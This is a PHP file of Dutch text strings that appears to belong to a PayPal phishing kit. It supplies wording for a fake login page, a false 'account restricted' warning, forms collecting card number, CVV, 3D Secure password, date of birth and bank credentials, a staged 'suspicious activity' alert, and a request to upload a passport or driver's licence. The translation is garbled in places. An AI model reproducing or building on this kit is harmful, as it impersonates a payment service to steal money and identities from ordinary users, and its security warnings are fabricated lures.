<?php
#LOGIN
$wiz_111 = 'Log in op uw PayPal-rekening';
$wiz_222 = 'Heeft u problemen met inloggen?';
$wiz_333 = 'Aanmelden';
$wiz_444 = 'Alle rechten voorbehouden aan PayPal Inc';
$wiz_900 = 'E-mail';
$wiz_901 = 'Wachtwoord';
$wiz_902 = '';
#INFO
$wiz_555 = 'Profiel';
$wiz_666 = 'Werk je foto';
$wiz_777 = 'Hi again!';
$wiz_888 = 'Uw PayPal-account is beperkt!';
$wiz_999 = 'benodigde informatie';
$wiz_903 = 'Voornaam';
$wiz_904 = 'Achternaam';
$wiz_905 = 'Adres';
$wiz_906 = 'stad';
$wiz_907 = 'Staat';
$wiz_910 = 'ZIP';
$wiz_911 = 'Telefoonnummer';
#-----NAV
$wiz_101 = 'Overzicht';
$wiz_102 = 'Activiteit';
$wiz_103 = 'Overdracht';
$wiz_104 = 'Portemonnee';
$wiz_105 = 'tijdschriften';
$wiz_106 = 'Uitloggen';
$wiz_107 = 'Hoofdmenu';
$wiz_108 = 'Account';
$wiz_109 = 'veiligheid';
$wiz_112 = 'betalingen';
$wiz_113 = 'meldingen';
#------FOOTER
$wiz_114 = 'HELP/CONTACT US';
$wiz_115 = 'SECURITY';
$wiz_116 = 'Alle rechten voorbehouden.';
$wiz_117 = 'Respect voor de privacy';
$wiz_118 = 'juridische overeenkomsten';
$wiz_119 = 'Comments';
#-------CCV
$wiz_120 = 'Kredietkaart';
$wiz_121 = 'Naam op kaart';
$wiz_123 = 'Kaartnummer';
$wiz_124 = "Exp.";
$wiz_125 = 'CVV (3-4) code';
$wiz_126 = 'Adresregel';
$wiz_127 = 'Bevestigen en Processen';
#--------VBV
$wiz_128 = 'Welkom bij Verification™';
$wiz_129 = 'Vul de onderstaande informatie om uw identiteit te verifiëren.';
$wiz_130 = 'Card Vervaldatum:';
$wiz_131 = 'Card Validation Code:';
$wiz_132 = 'Geboortedatum:';
$wiz_133 = 'Password of SecureCode(3d) :';
$wiz_134 = 'Alle rechten voorbehouden.';
#--------BANK
$wiz_135 = 'Kies uit één van deze commun banken';
$wiz_136 = 'Secure';
$wiz_137 = 'Ik heb een andere bank';
$wiz_138 = "Het is veilig om deze informatie te delen. PayPal is het niet redden.";
$wiz_139 = 'Door te klikken';
$wiz_140 = 'voortzetten';
$wiz_141 = 'Ik ga akkoord met de voorwaarden voor het koppelen van mijn bankrekening.';
$wiz_142 = 'uw Bank';
$wiz_143 = "Het is veilig om deze informatie te delen. PayPal is het niet redden.";
$wiz_144 = 'Username';
$wiz_145 = 'Wachtwoord';
$wiz_146 = 'Door te klikken';
$wiz_147 = 'voortzetten';
$wiz_148 = 'Ik ga akkoord met de voorwaarden voor het koppelen van mijn bankrekening.';
$wiz_149 = 'uw Bank';
$wiz_150 = 'naam Bank';
#--------Loading AND Police
$wiz_151 = 'verwerking';
$wiz_152 = 'Verdachte Activiteiten - Paypal';
$wiz_153 = 'Om u te helpen uw account wij regelmatig op zoek naar vroege tekenen van mogelijk frauduleuze activiteiten te beschermen.';
$wiz_154 = 'We zijn bezorgd over mogelijke ongeoorloofde activiteiten';
$wiz_155 = 'Nadat je je identiteit te bevestigen, zullen we u door stappen om uw account beter te beveiligen.';
$wiz_156 = 'Loggen van Onbekend apparaat';
$wiz_157 = 'in de buurt van Ossining, Verenigde Staten';
$wiz_158 = 'Gewoon om veilig te zijn, willen we ervoor zorgen dat dit is uw account.';
$wiz_159 = 'Contact';
$wiz_160 = 'veiligheid';
$wiz_161 = 'Uitloggen';
$wiz_162 = 'De volgende stappen, moet u zich volledig gevuld om de veiligheid van uw account op te houden en dat hij niet van een doorbraak';
#--------UPLOAD CART ID
$wiz_163 = 'bevestig je identiteit';
$wiz_164 = 'kiezen';
$wiz_165 = 'Upload bewijs van identiteit (aanbevolen)';
$wiz_166 = 'Krijgen een tekst';
$wiz_167 = 'Ontvang een automatisch telefoontje';
$wiz_168 = 'Fout deze optie niet beschikbaar is voor een moment Probeer andere opties';
$wiz_169 = 'Welk type document vindt u uploaden?';
$wiz_170 = 'vereisten show file';
$wiz_171 = 'Bestanden moeten kleiner zijn dan 10 MB.';
$wiz_172 = 'Gebruik een van deze bestandstypen: JPG, GIF, PNG, of PDF.';
$wiz_173 = 'Bestanden uploaden die up-to-date en leesbare informatie weer te geven.';
$wiz_174 = 'Selecteer één';
$wiz_175 = "Rijbewijs";
$wiz_176 = 'Paspoort';
$wiz_177 = 'militaire ID';
